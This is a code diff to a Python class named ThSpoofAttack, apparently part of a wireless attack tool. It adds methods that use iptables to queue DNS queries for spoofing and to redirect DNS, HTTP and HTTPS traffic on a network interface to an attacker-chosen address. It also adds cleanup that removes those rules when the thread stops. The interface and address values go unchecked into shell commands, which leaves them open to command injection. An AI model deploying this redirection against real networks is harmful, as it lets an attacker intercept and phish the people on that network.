@@ -364,10 +364,6 @@ class ThSpoofAttack(QThread):
             except Exception:
                 pass
     def redirection(self):
-        system('iptables --flush')
-        system('iptables --zero')
-        system('iptables --delete-chain')
-        system('iptables -F -t nat')
         system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
         system('iptables --append FORWARD --in-interface '+self.interface+' --jump ACCEPT')
         system('iptables --table nat --append POSTROUTING --out-interface '+self.interface+' --jump MASQUERADE')
@@ -376,9 +372,25 @@ class ThSpoofAttack(QThread):
         system('iptables -t nat -A PREROUTING -i '+self.interface+' -p udp --dport 53 -j DNAT --to '+self.redirect)
         system('iptables -t nat -A PREROUTING -i '+self.interface+' -p tcp --dport 53 -j DNAT --to '+self.redirect)
 
+    def redirectionAP(self):
+        system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
+        system('iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.redirect)
+        system('iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination '+self.redirect)
+        system('iptables -t nat -A PREROUTING -i '+self.interface+' -p udp --dport 53 -j DNAT --to '+self.redirect)
+        system('iptables -t nat -A PREROUTING -i '+self.interface+' -p tcp --dport 53 -j DNAT --to '+self.redirect)
+
+    def redirectionRemove(self):
+        system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE')
+        system('iptables -D FORWARD --in-interface '+self.interface+' --jump ACCEPT')
+        system('iptables --table nat -D POSTROUTING --out-interface '+self.interface+' --jump MASQUERADE')
+        system('iptables -t nat -D PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.redirect)
+        system('iptables -t nat -D PREROUTING -p tcp --dport 443 --jump DNAT --to-destination '+self.redirect)
+        system('iptables -t nat -D PREROUTING -i '+self.interface+' -p udp --dport 53 -j DNAT --to '+self.redirect)
+        system('iptables -t nat -D PREROUTING -i '+self.interface+' -p tcp --dport 53 -j DNAT --to '+self.redirect)
     def stop(self):
         print 'Stop Thread:' + self.objectName()
         self.finished = True
+        self.redirectionRemove()
         self.emit(SIGNAL('Activated( QString )'),'finished')
 
 '''http://stackoverflow.com/questions/17035077/python-logging-to-multiple-log-files-from-different-classes'''
